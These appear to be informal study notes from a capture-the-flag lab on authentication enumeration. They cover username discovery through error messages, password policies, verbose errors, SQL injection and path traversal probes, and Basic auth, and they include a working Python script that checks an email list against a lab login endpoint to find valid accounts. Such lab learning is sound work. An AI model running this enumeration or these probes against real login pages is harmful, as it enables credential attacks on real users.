# Authentication Enumeration

A security testing focusing on protecting sensitive part of a web application, inspecting password database and username validation.

---
##### How to add a ip address machine 

take the ip address go to the `/etc/hosts` and open nano and add the ip as well as the name mentioned.

---

Authentication enumeration is a process like peeling layers of onion, we remove layers of security to see the real operations happening.

### Identifying valid usernames

If we have the valid username, one can focus on finding the right password, so we can see it by just seeing what the server responds according to the input we give like "account doesn't exists" or "invalid password".

### pAssword policies

By understanding the policy, the attacker can know the complexity of the password used and strategize accordingly, for eg. some use regex to use atleast a symbol of sort in password.

#### Web pages

registration process in most are pretty straightforward and informative, so if we enter a account name for eg, it will give the msg of the account already taken or sort. Attackers use this feature to get the database of account and users, without direct access to database.

#### password reset 

Application feedback can refine the users database upon verifying it.

#### Database breaches

Acc to previous database breaches, the breaches usernames and passwords has the potential to be used in other platforms too, so with username aswell as potential passwords too.


Verbose errors can provide attackers some infos.

It can provide us with internal paths and directory structures which might contain config keys etc.

Database sneak peek and user info.

## Inducing verbose errors

1. SQL Injection attempts - malicious SQL commands into entry field, and hoping it would reveal the database structure like placing a single quote etc.

2. FIle traversal - commands like `../..` can be used to follow up on hidden or restricted file directories.

3. Form Manipulation - Tweaking fomr

python script use for finding out the correct email address.

```py
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

USing crunch to generate a random list of otps and numbers.

## BAsic auth

This uses Base64 enocding and decoding, so it takes the username and password like `admin:pass` and enocde it accordingly, this can be captured by burp.

To check if the server is ssh or ftp use nmap and see the port number it uses.
